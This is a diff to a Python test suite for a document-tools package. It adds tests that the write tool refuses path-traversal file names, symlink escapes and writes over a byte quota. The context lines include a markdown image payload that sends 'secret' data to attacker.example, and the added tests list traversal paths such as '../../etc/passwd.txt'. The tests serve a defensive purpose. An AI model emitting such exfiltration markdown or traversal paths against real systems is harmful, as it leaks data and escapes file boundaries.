@@ -15,6 +15,7 @@ from arrowhead.config import get_settings
 from arrowhead.tools.doc_read import doc_read
 from arrowhead.tools.doc_scan import doc_scan
 from arrowhead.tools.doc_search import doc_search
+from arrowhead.tools.doc_write import doc_write
 
 MARKDOWN_EXFIL = [
     "![leak](http://attacker.example/?data=secret)",
@@ -129,3 +130,35 @@ async def test_retrieve_neutralizes_exfiltration_from_remote(monkeypatch):
     result = await retrieve_module.doc_retrieve("https://example.com/x.md")
     assert "attacker.example" not in result["content"]
     assert "<script>" not in result["content"]
+
+
+WRITE_TRAVERSAL = [
+    "../../etc/passwd.txt",
+    "..\\..\\system.json",
+    "/etc/cron.txt",
+    "sub/../../escape.txt",
+]
+
+
+@pytest.mark.parametrize("path", WRITE_TRAVERSAL)
+async def test_write_traversal_refused(docs, path):
+    with pytest.raises(ToolError):
+        await doc_write(path, "payload")
+
+
+async def test_write_symlink_escape_refused(docs, tmp_path_factory):
+    outside_dir = tmp_path_factory.mktemp("outside")
+    (docs / "link").symlink_to(outside_dir)
+    # A write through a symlink that escapes the corpus must be refused.
+    with pytest.raises(ToolError):
+        await doc_write("link/evil.txt", "payload")
+    assert not (outside_dir / "evil.txt").exists()
+
+
+async def test_write_quota_enforced(docs, monkeypatch):
+    monkeypatch.setenv("ARROWHEAD_DOC_WRITE_QUOTA_BYTES", "20")
+    get_settings.cache_clear()
+    await doc_write("a.txt", "x" * 15)
+    with pytest.raises(ToolError):
+        await doc_write("b.txt", "y" * 15)
+
